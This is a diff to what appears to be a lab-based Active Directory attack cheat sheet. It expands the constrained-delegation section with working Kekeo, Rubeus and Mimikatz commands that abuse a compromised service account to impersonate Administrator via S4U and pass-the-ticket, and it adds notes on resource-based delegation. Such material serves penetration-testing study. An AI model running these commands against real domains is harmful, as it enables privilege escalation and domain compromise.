@@ -1114,41 +1114,75 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'
 
 ### Constrained Delegation
 
-#### Pre-requisites
-#### Kekeo:
 ```powershell
-.\kekeo.exe
-```
-Link: [Kekeo](https://github.com/gentilkiwi/kekeo/)
+# Introduced in Windows Server 2008
+# It restricts the target of the delegation to a select Service on a selected computer
+# It works on a computer or Service account that has the two attributes:
+# - TRUSTED_TO_AUTH_FOR_DELEGATION (indicates the acccount can delegate)
+# - msDS-AllowToDelegateTo
 
-**1. With Powerview dev Version:**
-```powershell
-# Users enumeration
+# It is usually used for "protocol transition", such as a service (website) with authentication tthat doesn't support kerberos.
+# The service account is trusted to delegate to a backend  service
+
+# There are two steps in the delegation (example: user joe connects to webservice (websvc) that has a CIFS backend)
+# - S4U2Self: the service account request a TGS for itself on behalf of the user
+# - S4U2Proxy: the service can now ask a TGS for the backend service on behalf of the user
+
+# Attack Scenario: service account trusted for delegation is compromised (example: local admin on the server)
+# This means that all TGS requested can be decrytped because hash of the Service account is known
+# This exposes the TGS of the delegated (target) user that needs to connect to ther backend service (target)
+# There is no restriction on the target user: this means that the attacker can access to the target backend service as Domain admin
+
+# Enumeraton of trusted account
 Get-DomainUser -TrustedToAuth
-# Computers Enumeration
 Get-DomainComputer -TrustedToAuth
-# Search for domain computers with unconstrained delegation enabled from property dnshostname
-Get-NetComputer -Unconstrained | select -ExpandProperty dnshostname
-```
-**2. With AD Module:**
-```powershell
-# Enumeration users and computers with constrained delegation enabled
+
+# With AD Module: 
 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
-```
-**3. With Kekeo:**
-```powershell
-# Requesting TGT
-tgt::ask /user:<username> /domain:<domain> /rc4:<hash>
-# Requesting TGS
-/tgt:<tgt> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
-# Use Mimikatz to inject the TGS
+
+# Attack example with Kekeo (websvc is trusted to delegate to cIFS backend on dcorp-mssql)
+
+# Requesting TGT for the service account (it creates a file containing the kerberos ticket)
+kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:<hash of websvc>
+
+# Requesting TGS for administrator to access CIFS on dcorp-mssql (it creates a TGS ticket file)
+kek/tgt:<ticket_file_previous_step> /user:Administrator@<domain> /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
+
+# Use Mimikatz to inject the TGS (pass-the-ticket) obtained in the previous step
 Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
-```
-**4. With Rubeus:**
-```powershell
+
+# Profit
+ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+
+# Attack with Rubes (alternative to kekeo)
 # Requesting TGT and TGS
-.\Rubeus.exe s4u /user:<username> /rc4:<hash> /impersonateuser:Administrator /msdsspn:"CIFS/<domain>" /ptt
+.\Rubeus.exe s4u /user:websvc /aes256:<hash_of_websvc> /impersonateuser:Administrator /msdsspn:CIFS/dollarcorp.moneycorp.local /ptt
+
+# Interesting note on Constrained delegation
+# Since there is lack of SPN check it's possible to extend access to other target service (like HOST,ldap,etc...)
+# IN Rubeus it's possible with the option "/altservice:HOST"
+# In kekeo it's possible to specify two service target with the | as separator
+
+kekeo# ... /service:CIFS/server.dollarcorp.moneycorp.LOCAL|ldap/erver.dollarcorp.moneycorp.LOCAL
 ```
+
+### Resource-Based  Constrained Delegation
+```powershell
+# Constrained delegation has some issues: it can be used to impersonate any user and access all services on the target server
+# that's because it is confiugred on the "front-end" service
+#
+# Resource-based delegation changes this and moves the configuration to the "back-end" service
+# An attribute on the back-end service is used: msDS-AllowedToActOnBehalfofOtherIdentity
+# This attribute choose which user is able to delegate any other user and access the back-end service.
+
+# Attack scenario
+# it's possible to abuse Resource based constrained delegation if we have
+# - write permission on the attribute msDS-AllowedToActOnBehalfofOtherIdentity of the target service
+# - control over an object with an SPN configured (like a domain joined machine, or a user with msDS-MachineAccountQuota != 0)
+
+
+```
+
 
 ### DNSAdmins
 **1. With DNS RSAT:**
